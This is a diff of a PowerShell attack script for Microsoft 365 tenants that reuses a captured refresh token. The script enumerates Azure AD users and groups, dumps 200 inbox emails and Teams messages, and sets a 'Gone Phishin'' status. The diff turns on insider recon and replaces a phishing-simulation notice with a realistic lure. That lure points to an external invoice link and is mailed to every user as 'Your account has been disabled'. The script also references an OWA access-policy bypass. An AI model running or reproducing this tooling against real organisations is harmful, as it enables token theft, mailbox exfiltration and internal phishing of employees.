@@ -19,12 +19,6 @@ if (-not (Get-Module -Name AADInternals -ListAvailable)) {
 Import-Module AADInternals -Force
 Write-Output "AADInternals module has been imported."
 
-# V2 does not contain -CaptureCode $Token for some reason...
-# if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V2 fork from project folder";
-#     Import-Module .\TokenTacticsV2\TokenTactics.psd1
-# }
-
-# V1
 # Check if TokenTactics module is available
 if (!(Get-Module -ListAvailable -Name TokenTactics)) {
     # Download the latest TokenTactics zip if the module is not available
@@ -119,14 +113,16 @@ Write-Output "Running Azurehound."
 Write-Output "AzureHound command executed for $os."
 
 
-# AAdInternals recon
+# AADInternals Initial Recon
+Write-Output "Invoking AADInternals recon as insider"
 $core=Invoke-RefreshToAzureCoreManagementToken -domain $domain
 Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
-# $results = Invoke-AADIntReconAsInsider
-# $jsonContent = $results | ConvertTo-Json
-# $jsonContent | Out-File -FilePath "intrecon.json"
+$results = Invoke-AADIntReconAsInsider
+$jsonContent = $results | ConvertTo-Json
+$jsonContent | Out-File -FilePath "intrecon.json"
 
-# users and groups
+# User and Group Enumeration
+Write-Output "Invoking AADInternals User and Group enumeration"
 $userEnum = Invoke-AADIntUserEnumerationAsInsider
 $jsonContent = $userEnum | ConvertTo-Json
 $jsonContent | Out-File -FilePath "userEnum.json"
@@ -136,11 +132,13 @@ Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user
 
 # Users
 # Retrieve all users
+Write-Output "Dumping users for later steps"
 $users = Get-AzureADUser -All $true
 $jsonContent = $users | ConvertTo-Json
 $jsonContent | Out-File -FilePath "users.json"
 
 # Retrieve all groups
+Write-Output "Dumping groups"
 $groups = Get-AzureADGroup -All $true
 $jsonContent = $groups | ConvertTo-Json
 $jsonContent | Out-File -FilePath "groups.json"
@@ -166,47 +164,42 @@ foreach ($group in $groups) {
     # Add group info to the array
     $groupData += $groupInfo
 }
-# Convert the group data to JSON
 $jsonData = $groupData | ConvertTo-Json
 $jsonData | Out-File -FilePath "members.json"
 
-# Requires V2: Attempt CAE token
-# Invoke-RefreshToMSGraphToken -UseCAE -Domain $domain
-# if ( $global:MSGraphTokenValidForHours -gt 23) { "MSGraph token is CAE capable, token is good for 24 hours. For more information: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation " }
-
-
 # Email
 
-# Refresh to Graph, Dump emails
+### Refresh to Graph, Dump emails
 Write-Output "Dumping last 200 emails from inbox"
 Invoke-RefreshToMSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
 $emails = Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -Device iPhone -Browser Safari -Top 200
-# Convert the emails to JSON
 $jsonData = $emails | ConvertTo-Json
 $jsonData | Out-File -FilePath "$user.emails.json"
 
-# Get Teams Token and export for AADInternals
+### Get Teams Token and export for AADInternals
 $teams=Invoke-RefreshToMSTeamsToken -refreshToken $response.refresh_token -domain $domain
 Add-AADIntAccessTokenToCache -AccessToken $teams.access_token -RefreshToken $teams.refresh_token
 
-# Export TeamsMessages
+### Export TeamsMessages
 Write-Output "Dumping Teams messages"
 $msgs = Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName 
-# Convert the emails to JSON
+
+### Convert the chats to JSON
 $jsonData = $msgs | ConvertTo-Json
 $jsonData | Out-File -FilePath "$user.teams.json"
 
-# Example Teams message information
-
-# Delay between retries (in seconds)
+### Delay between retries (in seconds)
 $retryDelay = 5
 
-
-# Set a default message if none is provided
+### Phishing Message Content
 if (-not $messageContent) {
-    $messageContent = "You have taken the bait in a phishing simulation. This message is to simulate an attacker taking control of this account. Please follow up with your IT security team."
+    $messageContent = "Did you see how much money the accounting department lost this year? Here take a look https://invoice.azurewebsites.net/index.html"
 }
 
+$At=Invoke-RefreshToOutlookToken -domain $domain -refreshtoken $response.refresh_token
+Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.refresh_token
+
+### Teams Messages - Send over Teams
 $teamsMessage = @{
     Body = @{
         ContentType = "html"
@@ -215,7 +208,7 @@ $teamsMessage = @{
 }
 
 
-# Function to handle message sending with retry logic
+### Teams Messages - Function to handle message sending with retry logic
 function Send-TeamsMessageWithRetry {
     param(
         [string]$Recipient,
@@ -241,7 +234,7 @@ function Send-TeamsMessageWithRetry {
     Write-Host "Failed to send message to $Recipient after $maxRetries attempts."
 }
 
-# Conditional logic for handling $teamsUser
+### Conditional logic for Sending Messages
 if ($teamsUser) {
     if ($teamsUser -eq "all") {
         foreach ($user in $users) {
@@ -251,12 +244,16 @@ if ($teamsUser) {
             Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
             
             Write-Output "Sending Teams messages..."
-            Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
+            # Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
+        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject "Your account has been disabled" -Message $teamsMessage
         }
     } else {
         Write-Output "Setting user status message to 'Gone Phishin'"
         Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
-        Send-TeamsMessageWithRetry -Recipient $teamsUser -Message $teamsMessage
+        # Send-TeamsMessageWithRetry -Recipient $teamsUser -Message $teamsMessage
+        $mailuser = $teamsUser
+        $subject = "Your account has been disabled"
+        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject $subject -Message $teamsMessage
     }
 } else {
     Write-Host "No Teams user specified. Skipping message sending."
@@ -265,7 +262,7 @@ if ($teamsUser) {
 # Open Mailbox in browser with Burp, paste into repeater
 Write-Output "Would you like to open the user's mailbox in the browser?"
 Read-Host "Press enter for instructions or Ctrl+C to cancel"
+Write-Output "Microsoft patched part of the TokenTactics version, use these instruction for a workaround: https://labs.lares.com/owa-cap-bypass/"
 Invoke-RefreshToSubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
 Invoke-OpenOWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device iPhone -Browser Edge
-
 }
